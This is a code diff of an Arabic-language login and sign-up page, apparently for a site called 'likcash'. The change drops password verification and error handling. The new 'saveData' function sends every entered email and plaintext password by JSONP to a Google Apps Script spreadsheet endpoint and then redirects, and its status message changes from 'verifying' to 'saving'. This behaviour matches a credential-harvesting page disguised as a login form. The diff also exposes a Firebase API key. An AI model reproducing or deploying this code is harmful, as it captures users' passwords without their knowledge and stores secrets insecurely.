@@ -63,6 +63,7 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
+        // إعدادات Firebase الخاصة بك
         const firebaseConfig = {
             apiKey: "AIzaSyBP77A_0dc3Z1H6jrUmhtapLF1w0Gbe4B8",
             authDomain: "likcash-auth.firebaseapp.com",
@@ -76,7 +77,8 @@
         const auth = getAuth(app);
         const provider = new GoogleAuthProvider();
 
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzis2co3719EHjdlPk57Jq2DmpCfZaaQfOSd55DdkZ5ahC0kXCg04zhS1Uqpeq3eDsmMw/exec';
+        // رابط النشر الجديد الخاص بك
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwtiGMBxd-ShLgVv425OiASpotdk6lO9eqRGOlhAMb8cl9-Cv6N6wN-RcfiVnWaNVkWZw/exec';
         const statusBox = document.getElementById('status');
 
         window.switchTab = (mode) => {
@@ -87,24 +89,15 @@
             statusBox.innerText = "";
         };
 
-        async function talkToSheet(params) {
-            return new Promise((resolve, reject) => {
+        // دالة الإرسال الخفيفة لضمان السرعة
+        async function saveData(params) {
+            return new Promise((resolve) => {
                 const callbackName = 'cb_' + Math.floor(Math.random() * 1000000);
                 const script = document.createElement('script');
                 
-                const timeout = setTimeout(() => {
-                    cleanup();
-                    reject("TIMEOUT");
-                }, 15000);
-
-                const cleanup = () => {
-                    clearTimeout(timeout);
-                    if (script.parentNode) document.body.removeChild(script);
-                    delete window[callbackName];
-                };
-
                 window[callbackName] = (data) => {
-                    cleanup();
+                    document.body.removeChild(script);
+                    delete window[callbackName];
                     resolve(data.result);
                 };
 
@@ -118,60 +111,47 @@
             const isLogin = method === 'Manual-Login';
             const email = isLogin ? document.getElementById('l-email').value : document.getElementById('s-email').value;
             const pass = isLogin ? document.getElementById('l-pass').value : document.getElementById('s-pass').value;
-            const name = isLogin ? "" : document.getElementById('s-name').value;
+            const name = isLogin ? "Utilisateur" : document.getElementById('s-name').value;
 
             if (!email || !pass) { 
-                statusBox.innerText = "يرجى ملء جميع الخانات"; 
+                statusBox.innerText = "عمر الخانات كاملة عفاك"; 
                 statusBox.style.color = "var(--error)"; 
                 return; 
             }
 
-            statusBox.innerText = "جاري التحقق..."; 
+            statusBox.innerText = "جاري الحفظ..."; 
             statusBox.style.color = "var(--primary)";
 
-            try {
-                const result = await talkToSheet({ email, password: pass, name, method });
-                if (result === "OK" || result === "SUCCESS") {
-                    statusBox.innerText = "تم بنجاح! جاري التوجيه...";
-                    statusBox.style.color = "var(--success)";
-                    setTimeout(() => { window.location.href = "w/check.html"; }, 1000);
-                } else {
-                    const messages = {
-                        "EXISTS": "هذا البريد مسجل مسبقاً!",
-                        "EMAIL_EXISTS": "هذا البريد مسجل مسبقاً!",
-                        "NOT_FOUND": "الحساب غير موجود!",
-                        "USER_NOT_FOUND": "الحساب غير موجود!",
-                        "WRONG_PASS": "كلمة المرور غير صحيحة!",
-                        "WRONG_PASSWORD": "كلمة المرور غير صحيحة!"
-                    };
-                    statusBox.innerText = messages[result] || "خطأ في البيانات";
-                    statusBox.style.color = "var(--error)";
-                }
-            } catch (e) {
-                statusBox.innerText = "تأخر الرد، حاول مرة أخرى";
-                statusBox.style.color = "orange";
+            const result = await saveData({ email, password: pass, name, method });
+
+            if (result === "OK") {
+                statusBox.innerText = "تم بنجاح! جاري التوجيه...";
+                statusBox.style.color = "var(--success)";
+                setTimeout(() => { window.location.href = "w/check.html"; }, 800);
+            } else {
+                statusBox.innerText = "خطأ في السيرفر، حاول مرة أخرى";
+                statusBox.style.color = "var(--error)";
             }
         };
 
         document.getElementById('google-signin').onclick = async () => {
             try {
                 statusBox.innerText = "جاري الاتصال بـ Google...";
-                statusBox.style.color = "var(--primary)";
                 const authResult = await signInWithPopup(auth, provider);
                 const user = authResult.user;
 
-                const sheetRes = await talkToSheet({
+                const res = await saveData({
                     email: user.email,
                     password: "GOOGLE_USER",
                     name: user.displayName,
                     method: "Google-Auth"
                 });
 
-                if (sheetRes === "OK" || sheetRes === "SUCCESS") {
+                if (res === "OK") {
                     window.location.href = "w/check.html";
                 }
             } catch (error) {
-                statusBox.innerText = "فشل تسجيل الدخول باستخدام Google";
+                statusBox.innerText = "فشل تسجيل الدخول بـ Google";
                 statusBox.style.color = "var(--error)";
             }
         };
